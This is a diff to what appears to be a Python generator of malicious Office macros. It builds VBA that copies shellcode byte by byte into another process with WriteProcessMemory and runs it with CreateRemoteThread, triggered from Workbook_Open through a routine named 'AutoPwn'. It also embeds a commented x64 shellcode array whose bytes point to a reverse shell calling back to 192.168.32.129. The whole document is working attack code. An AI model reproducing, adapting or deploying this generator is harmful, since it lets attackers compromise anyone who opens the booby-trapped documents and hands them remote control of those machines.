@@ -432,11 +432,41 @@ lines1 +=  ["Dim vFile As Variant\r\n",
 "End If      \r\n",
 "Position = lLinkToLibrary\r\n"]
 
+
+#buf = Array(72, 131, 228, 240, 232, 204, 0, 0, 0, 65, 81, 65, 80, 82, 81, 86, 72, 49, 210, 101, 72, 139, 82, 96, 72, 139, 82, 24, 72, 139, 82, 32, 72, 139, 114, 80, 72, 15, 183, 74, 74, 77, 49, 201, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 65, 81, 72, 139, 82, 32, 139, 66, 60, 72, 1, 208, 102, 129, 120, 24, _
+#11, 2, 15, 133, 114, 0, 0, 0, 139, 128, 136, 0, 0, 0, 72, 133, 192, 116, 103, 72, 1, 208, 80, 139, 72, 24, 68, 139, 64, 32, 73, 1, 208, 227, 86, 72, 255, 201, 65, 139, 52, 136, 72, 1, 214, 77, 49, 201, 72, 49, 192, 172, 65, 193, 201, 13, 65, 1, 193, 56, _
+#224, 117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, 64, 36, 73, 1, 208, 102, 65, 139, 12, 72, 68, 139, 64, 28, 73, 1, 208, 65, 139, 4, 136, 72, 1, 208, 65, 88, 65, 88, 94, 89, 90, 65, 88, 65, 89, 65, 90, 72, 131, 236, 32, 65, 82, 255, _
+#224, 88, 65, 89, 90, 72, 139, 18, 233, 75, 255, 255, 255, 93, 73, 190, 119, 115, 50, 95, 51, 50, 0, 0, 65, 86, 73, 137, 230, 72, 129, 236, 160, 1, 0, 0, 73, 137, 229, 73, 188, 2, 0, 1, 187, 192, 168, 32, 129, 65, 84, 73, 137, 228, 76, 137, 241, 65, 186, 76, 119, 38, 7, 255, 213, 76, 137, 234, 104, 1, 1, 0, 0, 89, 65, 186, 41, 128, 107, 0, _
+#255, 213, 106, 5, 65, 94, 80, 80, 77, 49, 201, 77, 49, 192, 72, 255, 192, 72, 137, 194, 72, 255, 192, 72, 137, 193, 65, 186, 234, 15, 223, 224, 255, 213, 72, 137, 199, 106, 16, 65, 88, 76, 137, 226, 72, 137, 249, 65, 186, 153, 165, 116, 97, 255, 213, 133, 192, 116, 10, 73, 255, 206, 117, 229, 232, 147, 0, 0, 0, 72, 131, 236, 16, 72, 137, 226, 77, 49, 201, 106, 4, 65, 88, 72, 137, 249, 65, 186, 2, 217, 200, 95, 255, 213, 131, 248, 0, 126, 85, 72, 131, 196, 32, 94, 137, 246, 106, 64, 65, 89, 104, 0, 16, 0, 0, 65, 88, 72, 137, 242, 72, 49, 201, 65, 186, 88, 164, 83, 229, 255, 213, 72, 137, 195, 73, 137, 199, 77, 49, 201, 73, 137, 240, 72, 137, 218, 72, 137, 249, 65, 186, 2, 217, 200, 95, 255, 213, 131, 248, 0, 125, 40, 88, 65, 87, 89, 104, 0, 64, 0, 0, 65, 88, 106, 0, 90, 65, 186, 11, 47, 15, 48, 255, 213, 87, 89, 65, 186, 117, 110, 77, 97, 255, 213, 73, 255, 206, 233, 60, 255, 255, 255, 72, 1, 195, 72, 41, 198, 72, 133, 246, 117, 180, 65, 255, 231, 88, 106, 0, 89, 73, 199, 194, 240, 181, 162, 86, 255, 213)
+
+lines1 += ["buf = Array("]
+length = len(pay64)-1
+total = 0
+
 # Insert 64 bit payload into position
-pos = 0
+lCount = 0
 for i in pay64:
-     	lines1 += ["rekt = WriteProcessMemory(hProcess, ByVal lLinkToLibrary + %s, %s, 1, b)\r\n" % (str(pos),str(int(i,16)))]
-     	pos += 1
+	if (total != length):
+		if (lCount < 100):
+			lines1 += ["%s," % str(int(i,16))]
+		else:
+			lines1 += ["%s, _\r\n" % (str(int(i,16)))]
+			lCount = 0
+	else:
+		lines1 += ["%s)\r\n" % (str(int(i,16)))]
+
+	lCount += 1
+	total += 1
+
+
+#Injection loop
+lines1 += ["Dim myCount As Integer\r\n",
+"For myCount = LBound(buf) To UBound(buf)\r\n",
+"Dim myByte As Byte\r\n",
+"myByte = buf(myCount)\r\n",
+"rekt = WriteProcessMemory(hProcess, ByVal (lLinkToLibrary + myCount), myByte, 1, b)\r\n",
+"Next myCount\r\n"]
+ 
 
 lines1 += ["hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary, 0, 0, ByVal 0&)\r\n",
 "If hThread = 0 Then\r\n",
@@ -457,10 +487,30 @@ lines1 += ["hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary,
 
 # Insert 32 bit payload into position
 
-pos = 0
+lines1 += ["buf = Array("]
+length = len(pay86)-1
+total = 0
+
+lCount = 0
 for i in pay86:
-        lines1 += ["rekt = WriteProcessMemory(hProcess, ByVal lLinkToLibrary + %s, %s, 1, b)\r\n" % (str(pos),str(int(i,16)))]
-        pos += 1
+	if (total != length):
+		if (lCount < 100):
+			lines1 += ["%s," % str(int(i,16))]
+		else:
+			lines1 += ["%s, _\r\n" % (str(int(i,16)))]
+			lCount = 0
+	else:
+		lines1 += ["%s)\r\n" % (str(int(i,16)))]
+
+	lCount += 1
+	total += 1
+
+
+#Injection loop
+lines1 += ["For myCount = LBound(buf) To UBound(buf)\r\n",
+"myByte = buf(myCount)\r\n",
+"rekt = WriteProcessMemory(hProcess, ByVal (lLinkToLibrary + myCount), myByte, 1, b)\r\n",
+"Next myCount\r\n"]
 
 lines1 += ["hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary, 0, 0, ByVal 0&)\r\n",
 "If hThread = 0 Then\r\n",
@@ -484,10 +534,30 @@ lines1 += ["hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary,
 
 # Insert 32 bit payload into position
 
-pos = 0
+lines1 += ["buf = Array("]
+length = len(pay86)-1
+total = 0
+
+lCount = 0
 for i in pay86:
-        lines1 += ["rekt = WriteProcessMemory(hProcess, ByVal lLinkToLibrary + %s, %s, 1, b)\r\n" % (str(pos),str(int(i,16)))]
-        pos += 1
+	if (total != length):
+		if (lCount < 100):
+			lines1 += ["%s," % str(int(i,16))]
+		else:
+			lines1 += ["%s, _\r\n" % (str(int(i,16)))]
+			lCount = 0
+	else:
+		lines1 += ["%s)\r\n" % (str(int(i,16)))]
+
+	lCount += 1
+	total += 1
+
+
+#Injection loop
+lines1 += ["For myCount = LBound(buf) To UBound(buf)\r\n",
+"myByte = buf(myCount)\r\n",
+"rekt = WriteProcessMemory(hProcess, ByVal (lLinkToLibrary + myCount), myByte, 1, b)\r\n",
+"Next myCount\r\n"]
 
 lines1 += ["hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary, 0, 0, ByVal 0&)\r\n",
 "If hThread = 0 Then\r\n",
@@ -505,19 +575,19 @@ lines1 += ["hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary,
 "Sub Workbook_Open()\r\n",
 "DieTotal\r\n",
 "AutoPwn\r\n",
-"End Sub\r\n",
-"Sub Auto_Open()\r\n",
-"DieTotal\r\n",
-"AutoPwn\r\n",
-"End Sub\r\n",
-"Sub AutoExec()\r\n",
-"DieTotal\r\n",
-"AutoPwn\r\n",
-"End Sub\r\n",
-"Sub Auto_Exec()\r\n",
-"DieTotal\r\n",
-"AutoPwn\r\n",
-"End Sub"]
+"End Sub\r\n"]
+#"Sub Auto_Open()\r\n",
+#"DieTotal\r\n",
+#"AutoPwn\r\n",
+#"End Sub\r\n",
+#"Sub AutoExec()\r\n",
+#"DieTotal\r\n",
+#"AutoPwn\r\n",
+#"End Sub\r\n",
+#"Sub Auto_Exec()\r\n",
+#"DieTotal\r\n",
+#"AutoPwn\r\n",
+#"End Sub"]
 
 # Open and write to text file
 
